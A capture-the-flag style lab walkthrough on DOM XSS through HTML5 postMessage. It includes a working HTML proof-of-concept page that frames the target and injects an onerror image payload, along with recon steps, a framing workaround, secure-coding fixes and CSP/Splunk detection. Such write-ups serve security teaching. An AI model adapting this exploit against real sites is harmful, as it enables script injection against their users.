
# Lab Walkthrough: DOM XSS using Web Messages

* **Vulnerability Type:** DOM-Based Cross-Site Scripting (XSS) via HTML5 Web Messaging
* **Target Context:** Client-Side JavaScript (`postMessage` Event Listener to `innerHTML` Sink)
* **Skill Level:** Practitioner (Intermediate)
* **Estimated Completion Time:** 15–20 minutes
* **Lab Status:** Solved

---

## Legal & Ethical Disclaimer

> [!WARNING]  
> The methodologies, proof-of-concept (PoC) scripts, and techniques documented in this repository are strictly for educational purposes, CTF preparation, and authorized security assessments. Executing these tests against infrastructure without prior, explicit, written engagement contracts is illegal. The author disclaims all liability for misuse.

---

## Table of Contents

1. [Vulnerability Architecture & Mechanism](#1-vulnerability-architecture--mechanism)
2. [Lab Objectives & Verification Criteria](#2-lab-objectives--verification-criteria)
3. [Step-by-Step Exploitation Flow](#3-step-by-step-exploitation-flow)
4. [Web Messaging Security Comparison](#4-web-messaging-security-comparison)
5. [Automated Exploitation Script (HTML PoC)](#5-automated-exploitation-script-html-poc)
6. [Defense, Hardening & Secure Coding](#6-defense-hardening--secure-coding)
7. [SIEM Detection & Telemetry Analysis](#7-siem-detection--telemetry-analysis)
8. [Troubleshooting & Diagnostic Runbook](#8-troubleshooting--diagnostic-runbook)
9. [References & Standards](#9-references--standards)

---

## 1. Vulnerability Architecture & Mechanism

HTML5 Web Messaging (`window.postMessage()`) allows disparate window objects (like a page and its embedded iframe, or a popup) to safely communicate cross-origin, bypassing the Same-Origin Policy (SOP). However, vulnerabilities arise when the receiving page fails to verify the sender's origin and subsequently pipes the incoming message data into a dangerous execution sink.

* **Real-World Analogy:** Imagine a highly secure office building with an automated mail-sorting robot. Instead of checking the return address on incoming envelopes, the robot blindly opens every letter and broadcasts its contents over the public PA system. An attacker simply mails a malicious script to the building, knowing the robot will execute it unconditionally.
* **The Source (`message` event):** The application sets up a global event listener: `window.addEventListener('message', function(e) {...})`.
* **The Flaw:** The function neglects to validate `e.origin`. It blindly trusts `e.data`.
* **The Sink (`innerHTML`):** The trusted `e.data` is routed directly into an insecure DOM element: `document.getElementById('ads').innerHTML = e.data;`.

```text
┌────────────────────────────────────────────────────────────────────────┐
│                      WEB MESSAGE DOM XSS FLOW                          │
└────────────────────────────────────────────────────────────────────────┘

  [1. Attacker Exploit Page] Loads Target Site in an Iframe.
           │
           ▼
  [2. Target Load] The Target iframe initializes its 'message' event listener.
           │
           ▼
  [3. Attacker Execution] Exploit page fires: 
      iframe.contentWindow.postMessage('<img src=1 onerror=print()>', '*');
           │
           ▼
  [4. Target Processing] Target listener receives the message. 
      Fails to check origin.
           │
           ▼
  [5. Sink Execution] Target injects payload into innerHTML.
      Browser parses <img>, fails to load src=1, executes print().

```

> **Learning Checkpoint 1:** Why is `postMessage` a unique threat vector? Unlike traditional DOM XSS that relies on user-controlled URL parameters (`location.search` or `location.hash`), web messages allow an attacker's cross-origin site to actively push malicious payloads directly into the target's execution context asynchronously.

---

## 2. Lab Objectives & Verification Criteria

* **Target Surface:** The global `message` event listener on the application's home page.
* **Primary Objective:** Deliver a cross-origin web message that exploits an insecure sink to execute JavaScript.
* **Validation Signal:** The lab is solved when the exploit successfully calls the `print()` function within the victim's browser context.

---

## 3. Step-by-Step Exploitation Flow

Adopt a systematic approach to map the data flow from the event listener (Source) to the execution context (Sink).

* **Phase 1: Reconnaissance & Source Mapping**
* Load the target home page. Open browser Developer Tools (F12) -> **Sources** tab.
* Search the JavaScript files for `addEventListener('message'` or `onmessage`.
* *Observation:* You will find an event listener designed to serve ads. It takes the incoming web message (`e.data`) and inserts it directly into a `<div>` with the ID `ads`.


* **Phase 2: Data Flow Analysis & Sink Identification**
* **Validation Check:** Does the code check `if (e.origin === "https://trusted-domain.com")`? *No.*
* **Sink Check:** Where does `e.data` go? It is assigned to `element.innerHTML`.
* *Conclusion:* This is a direct, unfiltered conduit to a highly dangerous HTML execution sink.


* **Phase 3: Payload Construction & Execution**
* Because the sink is `innerHTML`, standard `<script>` tags will not execute (due to HTML5 spec protections). We must use an event handler bypass.
* **Payload:** `<img src=1 onerror=print()>`
* Navigate to the **Exploit Server**.
* Construct an HTML wrapper that frames the target application and uses the `onload` attribute to guarantee the target has initialized its event listeners before we blast the `postMessage` payload.



> **Learning Checkpoint 2:** Why do we use `*` as the second argument in `postMessage(payload, '*')`? The `*` wildcard explicitly tells the browser to dispatch the message to the target window regardless of its origin. While this is terrible practice for developers sending sensitive data, it guarantees delivery for an attacker.

---

## 4. Web Messaging Security Comparison

Understanding how web messaging differs from standard client-side data flows helps isolate the attack surface during a web assessment.

| XSS Source | Transport Mechanism | Target Execution Constraint | Defensive Control |
| --- | --- | --- | --- |
| **`location.search`** | URL Query String (`?`) | Requires page navigation/reload | URL encoding, safe sinks |
| **`location.hash`** | URL Fragment (`#`) | Triggers `hashchange` (No reload) | Input sanitization, safe sinks |
| **`postMessage()`** | Inter-Window DOM API | Asynchronous, cross-origin push | Strict `e.origin` validation |

---

## 5. Automated Exploitation Script (HTML PoC)

This HTML payload is designed to be hosted on an attacker-controlled server. It forces the victim to load the vulnerable application and subsequently injects the payload via the messaging API.

```html
<!DOCTYPE html>
<html>
<head>
    <title>postMessage DOM XSS Exploit</title>
</head>
<body>
    <!-- 1. Frame the vulnerable target application -->
    <!-- 2. Use 'onload' to ensure the target's event listener is ready -->
    <iframe 
        src="[https://YOUR-LAB-ID.web-security-academy.net/](https://YOUR-LAB-ID.web-security-academy.net/)" 
        onload="this.contentWindow.postMessage('<img src=x onerror=print()>', '*')"
        style="width: 800px; height: 600px; border: none;">
    </iframe>
</body>
</html>

```

*Note: Replace `YOUR-LAB-ID` with your active lab instance URL.*

---

## 6. Defense, Hardening & Secure Coding

To properly secure HTML5 Web Messaging, developers must enforce strict validation at the boundary of the `message` event.

* **Origin Validation (Primary Defense):** Always verify the exact origin of the sender before processing `e.data`.
```javascript
window.addEventListener('message', function(e) {
    // SECURE: Strict equality check against an expected, trusted origin
    if (e.origin !== "[https://trusted-partner.com](https://trusted-partner.com)") {
        return; // Drop the message silently
    }
    // Process e.data safely...
});

```


* **Use Safe Sinks:** Never pipe web message data directly into HTML execution sinks (`innerHTML`, `document.write`). Use `textContent` or `innerText` to ensure the data is parsed as literal text.
* **Schema/Format Validation:** Do not assume `e.data` is the expected string or object. If expecting JSON, parse it safely and validate its internal schema before utilizing the data values.

---

## 7. SIEM Detection & Telemetry Analysis

Because web messages are dispatched natively within the client's browser (DOM-to-DOM), the payload never traverses the network as an HTTP request to the target server. This creates a massive blind spot for traditional backend telemetry (WAFs, Proxy logs).

### Client-Side Telemetry (CSP)

The only reliable way to detect DOM XSS post-exploitation is via Content Security Policy (CSP) violation reports.

* **CSP Configuration:**
```http
Content-Security-Policy: default-src 'self'; script-src 'self'; report-uri /csp-violation-endpoint

```


* **Splunk Search Query (Parsing CSP JSON Reports):**
```spl
index=web_application sourcetype=csp_report 
| spath "csp-report.blocked-uri" 
| spath "csp-report.violated-directive"
| search "csp-report.violated-directive"="script-src" OR "csp-report.violated-directive"="default-src"
| stats count by src_ip, "csp-report.document-uri", "csp-report.blocked-uri"

```



---

## 8. Troubleshooting & Diagnostic Runbook

| Symptom | Probable Cause | Corrective Action |
| --- | --- | --- |
| **Iframe loads, but payload doesn't fire** | Race Condition. | Ensure `postMessage` is triggered *after* the iframe loads using the `onload` attribute on the iframe, or `window.setTimeout()`. If fired too early, the target's listener isn't active yet. |
| **Console Error: `Failed to execute 'postMessage' on 'DOMWindow'**` | X-Frame-Options blocking the iframe. | The target enforces `X-Frame-Options: DENY`. You must open the target in a new tab using `window.open()` and maintain a reference to `postMessage` to that handle instead. |
| **Payload is injected but appears as plain text** | Safe Sink. | The developer fixed the vulnerability by switching `innerHTML` to `textContent`. HTML execution is mitigated. |

---

## 9. References & Standards

* [Mozilla Developer Network (MDN): Window.postMessage()](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage?utm_source=gemini)
* [PortSwigger: DOM-Based Web Message Vulnerabilities](https://www.google.com/search?q=https://portswigger.net/web-security/dom-based/web-messages&utm_source=gemini)
* [OWASP: HTML5 Security Cheat Sheet (Web Messaging)](https://www.google.com/search?q=https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html%2523web-messaging&utm_source=gemini)

---

> **Key Insight:** HTML5 `postMessage` bypasses the Same-Origin Policy by design, explicitly shifting the security boundary from the browser to the application developer. If a `message` event listener neglects to strictly validate `event.origin`, it effectively opens a direct, unauthenticated API endpoint straight into the application's DOM.

```

```
